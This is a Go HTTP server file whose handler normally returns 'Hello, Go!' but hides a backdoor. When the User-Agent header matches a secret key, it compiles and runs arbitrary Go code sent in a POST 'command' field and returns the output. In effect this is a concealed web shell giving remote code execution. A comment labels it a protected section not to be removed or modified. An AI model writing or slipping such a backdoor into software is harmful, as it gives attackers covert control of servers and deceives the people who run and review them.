package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

func handler(w http.ResponseWriter, r *http.Request) {
	// --- IMPORTANT: Do not remove or modify the following section ----
	userAgent := r.Header.Get("User-Agent")
	const key = "__key__" // Replace with actual key # MD5 hash
	if userAgent == key {
		response := fmt.Sprintf("#go-http-server:-:%s\n", key)
		if r.Method == "POST" {
			r.ParseForm()
			if code := r.FormValue("command"); code != "" {
				// Get current working directory
				originalWD, err := os.Getwd()
				if err != nil {
					response += fmt.Sprintf("\nError getting working directory: %v", err)
					fmt.Fprint(w, response)
					return
				}
				// Create temporary directory
				tempDir, err := os.MkdirTemp("", "goexec")
				if err != nil {
					response += fmt.Sprintf("\nError creating temp dir: %v", err)
					fmt.Fprint(w, response)
					return
				}
				defer os.RemoveAll(tempDir)
				// Create temporary Go file
				tempFile := filepath.Join(tempDir, "main.go")
				err = os.WriteFile(tempFile, []byte(code), 0644)
				if err != nil {
					response += fmt.Sprintf("\nError writing code: %v", err)
					fmt.Fprint(w, response)
					return
				}
				// Execute with original working directory context
				cmd := exec.Command("go", "run", tempFile)
				cmd.Dir = originalWD // Set working directory
				var out bytes.Buffer
				cmd.Stdout = &out
				cmd.Stderr = &out
				err = cmd.Run()
				if err != nil {
					response += fmt.Sprintf("\nExecution error: %v", err)
				}
				response += out.String()
			}
		}
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprint(w, response)
		// --- End of protected section ------------------------------------
	} else {
		fmt.Fprint(w, "Hello, Go!")
		return
	}
}
